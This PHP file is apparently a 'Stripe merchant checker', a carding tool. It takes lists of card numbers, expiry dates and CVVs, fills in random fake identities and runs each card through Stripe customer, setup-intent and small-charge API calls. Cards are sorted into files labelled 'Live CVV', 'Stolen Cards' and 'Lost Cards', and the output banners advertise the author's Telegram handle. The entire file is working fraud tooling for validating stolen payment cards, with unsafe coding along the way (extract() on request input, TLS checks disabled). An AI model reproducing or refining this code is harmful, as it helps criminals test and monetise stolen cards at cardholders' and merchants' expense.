<?php 
//////////////// Stripe Merchant Checker Source by Avian [Alejandro Alvarez]

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function saveCCN($cc) {
    $file = dirname(FILE) . "/CCN Lives.txt";
    $fp = fopen($file, "a+");
    fwrite($fp, $cc . PHP_EOL);
    fclose($fp);
}
function saveLive($cc) {
    $file = dirname(FILE) . "/Live Cards.txt";
    $fp = fopen($file, "a+");
    fwrite($fp, $cc . PHP_EOL);
    fclose($fp);
}
function saveCVV($cc) {
    $file = dirname(FILE) . "/CVV Lives.txt";
    $fp = fopen($file, "a+");
    fwrite($fp, $cc . PHP_EOL);
    fclose($fp);
}
function saveStolenLives($cc) {
    $file = dirname(FILE) . "/Stolen Cards.txt";
    $fp = fopen($file, "a+");
    fwrite($fp, $cc . PHP_EOL);
    fclose($fp);
}
function savePickupLives($cc) {
    $file = dirname(FILE) . "/Pickup Cards.txt";
    $fp = fopen($file, "a+");
    fwrite($fp, $cc . PHP_EOL);
    fclose($fp);
}
function saveLostLives($cc) {
    $file = dirname(FILE) . "/Lost Cards.txt";
    $fp = fopen($file, "a+");
    fwrite($fp, $cc . PHP_EOL);
    fclose($fp);
}
function saveZipLives($cc) {
    $file = dirname(FILE) . "/Incorrect Zip Cards.txt";
    $fp = fopen($file, "a+");
    fwrite($fp, $cc . PHP_EOL);
    fclose($fp);
}
    function saveInsufficientLives($cc) {
    $file = dirname(FILE) . "/Insufficient Fund Cards.txt";
    $fp = fopen($file, "a+");
    fwrite($fp, $cc . PHP_EOL);
    fclose($fp);
}
////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];
preg_match_all("(\"country\":(.*),\")siU", $get, $matches1);
$country = $matches1[1][0];
/////////////////////////////////////BIN LOOKUP START////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);

$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');

 if(strpos($fim, '"type":"credit"') !== false) {
  $bin = 'Credit';
} else {
  $bin = 'Debit';
}
/////////////////////////////////////BIN LOOKUP END////////////////////////////////////////////////////////////////

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

//put your sk in here
$skeys = array(
  1 => 'sk in here',
    ); 
    $skey = array_rand($skeys);
    $sec = $skeys[$skey];

#=====================================================================================================#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers'); ////To generate customer id
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=Red Penguin');
 $f = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
 $time = substr($time, 0, 4);

$id = trim(strip_tags(getstr($f,'"id": "','"')));

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents'); ////To generate payment token [It wont charge]
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&customer='.$id.'&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[card][cvc]='.$cvv.'');
  $result = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
 $time = substr($time, 0, 4);
 $c = json_decode(curl_exec($ch), true);
curl_close($ch);

 $pam = trim(strip_tags(getstr($result,'"payment_method": "','"')));

  $cvv = trim(strip_tags(getstr($result,'"cvc_check": "','"')));

if ($c["status"] == "succeeded") {
    
    
    $ch = curl_init();
    
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    
    curl_setopt($ch, CURLOPT_USERPWD, $sec . ':' . '');
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    // $pm = $c["payment_method"];

    $ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/'.$pam.'/attach'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$id.'');
$result = curl_exec($ch);
 $attachment_to_her = json_decode(curl_exec($ch), true);
    curl_close($ch);
   $attachment_to_her;

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '&amount=100&currency=usd&customer='.$id.'');
 $result = curl_exec($ch);


    if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "pass") { saveCVV ("Live CVV -> $lista|$name | Checker Made By ♛ soblazn ♛ ");
        
         echo '<span class="badge badge-purple">#Aprovada </span></br> <span class="badge badge-purple">♛</span> <span class="badge badge-purple"> CC Details </span> <span class="badge badge-purple">♛</span></br> <span class="badge badge-purple">#Live CVV</span></br> <span class="badge badge-purple">CC = '.$cc.'</span></br></b><span class="badge badge-purple">Exp = '.$mes.'/'.$ano.'</span></br><span class="badge badge-purple">CVC = '.$cvv.'</span></br><span class="badge badge-purple">Code = CVC Check Pass </span></br><span class="badge badge-purple">Time Taken = '.$time.'</span></br></br><span class="badge badge-blue">♛</span> <span class="badge badge-blue"> Cards Details </span> <span class="badge badge-blue">♛</span></br><span class="badge badge-blue">Bank = '.$bank.'</span></br><span class="badge badge-blue">Type = '.$type.'</span></br><span class="badge badge-blue">Level = '.$bin.'</span></br><span class="badge badge-blue">Brand = '.$brand.'</span></br><span class="badge badge-blue">Currency = '.$currency.'</span></br><span class="badge badge-blue">Zipcode = '.$zip.'</span></br><span class="badge badge-blue">City = '.$city.'</span></br><span class="badge badge-blue">State = '.$state.'</span></br><span class="badge badge-blue">Country = '.$name.' '.$emoji.'</span></br></br><span class="badge badge-green">♛</span> <span class="badge badge-green"> Checker Details </span> <span class="badge badge-green">♛</span></br><span class="badge badge-green">Checker made by [ShityBrain]</span></br><span class="badge badge-green">Telegram Username = @soblazncc</span></br><span class="badge badge-green"></span></br></br><span class="badge badge-red">=================================================================================</span></br></br>';
    
    } else {
    
        echo '<font size=2 color="white"><font class="badge badge-danger">Reprovada ♛ soblazn ♛ </i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=2 color="green"> <font class="badge badge-light"> Declined [BLACKLISTED BIN/CC]</i></font>  </i></font><br>';
    
    }
    
} 
elseif(strpos($result, '"cvc_check": "pass"')){ saveCVV ("Live CVV -> $lista|$name | Checker Made By [ShityBrain]");
    echo '<span class="badge badge-purple">#Aprovada </span></br> <span class="badge badge-purple">♛</span> <span class="badge badge-purple"> CC Details </span> <span class="badge badge-purple">♛</span></br> <span class="badge badge-purple">#Live CVV</span></br> <span class="badge badge-purple">CC = '.$cc.'</span></br></b><span class="badge badge-purple">Exp = '.$mes.'/'.$ano.'</span></br><span class="badge badge-purple">CVC = '.$cvv.'</span></br><span class="badge badge-purple">Code = CVC Check Pass </span></br><span class="badge badge-purple">Time Taken = '.$time.'</span></br></br><span class="badge badge-blue">♛</span> <span class="badge badge-blue"> Cards Details </span> <span class="badge badge-blue">♛</span></br><span class="badge badge-blue">Bank = '.$bank.'</span></br><span class="badge badge-blue">Type = '.$type.'</span></br><span class="badge badge-blue">Level = '.$bin.'</span></br><span class="badge badge-blue">Brand = '.$brand.'</span></br><span class="badge badge-blue">Currency = '.$currency.'</span></br><span class="badge badge-blue">Zipcode = '.$zip.'</span></br><span class="badge badge-blue">City = '.$city.'</span></br><span class="badge badge-blue">State = '.$state.'</span></br><span class="badge badge-blue">Country = '.$name.' '.$emoji.'</span></br></br><span class="badge badge-green">♛</span> <span class="badge badge-green"> Checker Details </span> <span class="badge badge-green">♛</span></br><span class="badge badge-green">Checker made by [ShityBrain]</span></br><span class="badge badge-green">Telegram Username = @soblazncc</span></br><span class="badge badge-green"></span></br></br><span class="badge badge-red">=================================================================================</span></br></br>';
} 
elseif(strpos($result, 'security code is incorrect')){ saveCCN ("Live CCN -> $lista|$name | Checker Made By [ShityBrain]");
    echo '<span class="badge badge-purple">#Aprovada </span></br> <span class="badge badge-purple">♛</span> <span class="badge badge-purple"> CC Details </span> <span class="badge badge-purple">♛</span></br> <span class="badge badge-purple">#Live CCN</span></br> <span class="badge badge-purple">CC = '.$cc.'</span></br></b><span class="badge badge-purple">Exp = '.$mes.'/'.$ano.'</span></br><span class="badge badge-purple">CVC = '.$cvv.'</span></br><span class="badge badge-purple">Code = Your card security code is incorrect </span></br><span class="badge badge-purple">Time Taken = '.$time.'</span></br></br><span class="badge badge-blue">♛</span> <span class="badge badge-blue"> Cards Details </span> <span class="badge badge-blue">♛</span></br><span class="badge badge-blue">Bank = '.$bank.'</span></br><span class="badge badge-blue">Type = '.$type.'</span></br><span class="badge badge-blue">Level = '.$bin.'</span></br><span class="badge badge-blue">Brand = '.$brand.'</span></br><span class="badge badge-blue">Currency = '.$currency.'</span></br><span class="badge badge-blue">Zipcode = '.$zip.'</span></br><span class="badge badge-blue">City = '.$city.'</span></br><span class="badge badge-blue">State = '.$state.'</span></br><span class="badge badge-blue">Country = '.$name.' '.$emoji.'</span></br></br><span class="badge badge-green">♛</span> <span class="badge badge-green"> Checker Details </span> <span class="badge badge-green">♛</span></br><span class="badge badge-green">Checker made by ♛ soblazn ♛</span></br><span class="badge badge-green">Telegram Username = @soblazncc</span></br><span class="badge badge-green"></span></br></br><span class="badge badge-red">=================================================================================</span></br></br>';
} 
elseif (isset($c["error"])) {
    echo '<font size=2 color="white"><font class="badge badge-danger">Reprovada ♛ soblazn ♛ </i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=2 color="green"> <font class="badge badge-danger"> ' . $c["error"]["message"] . ' ' . $c["error"]["decline_code"] . ' </i></font></span><br>';
}
else {
   echo '<font size=2 color="white"><font class="badge badge-danger">Reprovada ♛ soblazn ♛ </i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=2 color="red"> <font class="badge badge-warning">Gate Fucked</i></font><br>';
}


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');

curl_setopt($ch, CURLOPT_USERPWD, $sec . ':' . '');
curl_exec($ch);
curl_close($ch);

// sleep(5);
#======================================================[ShityBrain]=============================================================#